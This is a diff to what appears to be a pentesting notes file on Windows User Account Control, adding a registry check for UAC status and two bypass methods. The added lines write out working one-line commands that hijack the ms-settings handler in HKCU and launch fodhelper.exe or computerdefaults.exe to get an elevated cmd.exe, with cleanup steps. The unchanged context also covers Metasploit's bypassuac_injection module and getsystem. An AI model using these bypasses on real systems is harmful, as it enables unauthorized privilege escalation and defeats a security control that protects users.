@@ -2,16 +2,49 @@
 
 ![](uac_example.png)
 
+---
 
 ## UAC Enable Verification
 You can use the `reg query` command to check the value of the registry key related to UAC:
 
-```bash
+```powershell
 reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
 ```
 
 - If the value of `EnableLUA` is `1`, UAC is enabled.
 - If the value of `EnableLUA` is `0`, UAC is disabled.
+
+
+---
+## Bypass using cmd commands
+### Method 1: fodhelper.exe (Auto-Elevated Binary)
+
+`fodhelper.exe` auto-elevates and trusts HKCU registry keys.
+
+```powershell
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
+```
+
+Cleanup:
+```powershell
+reg delete HKCU\Software\Classes\ms-settings /f
+```
+
+### Method 2: computerdefaults.exe
+
+Alternative auto-elevated binary.
+```powershell
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
+```
+
+Cleanup:
+```powershell
+reg delete HKCU\Software\Classes\ms-settings /f
+```
+
+
+---
+
 
 ## BypassUAC_injection (Metasploit)
 1. **Set up the module**: To use the `bypassuac_injection` module, start by selecting it within Metasploit:
@@ -38,6 +71,9 @@ run
 ```bash
 getsystem
 ```
+
+
+---
 
 ## UACMe
 
